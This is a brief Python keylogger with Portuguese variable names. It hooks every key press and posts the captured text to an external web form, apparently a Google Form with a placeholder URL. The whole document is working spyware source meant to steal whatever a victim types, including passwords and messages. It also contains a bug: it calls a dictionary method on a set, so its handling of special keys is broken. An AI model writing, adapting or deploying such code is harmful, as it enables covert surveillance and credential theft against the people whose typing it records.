import keyboard
from requests import post

teclas_apertadas = []
teclas_especiais = {'alt', 'alt gr', 'ctrl', 'left alt', 'left ctrl', 'left shift', 'left windows', 'right alt', 'right ctrl', 'right shift', 'right windows', 'shift', 'windows', '\n'}

url_form = 'default' #linkParaForm
def trata_tecla(k):        
    if 'shift' in k.modifiers:
        teclas_apertadas.pop()
    tecla = k.name
    
    if len(tecla) > 1:
        tecla = teclas_especiais.get(tecla, '<< {} >>'.format(tecla))
    teclas_apertadas.append(tecla)
    
    if len(teclas_apertadas) >= 1:
        texto_digitado = ''.join(teclas_apertadas)
        teclas_apertadas.clear()
        post(url_form, {'entry.1269107664':texto_digitado}) #name= entry.1269107664

keyboard.on_press(trata_tecla)
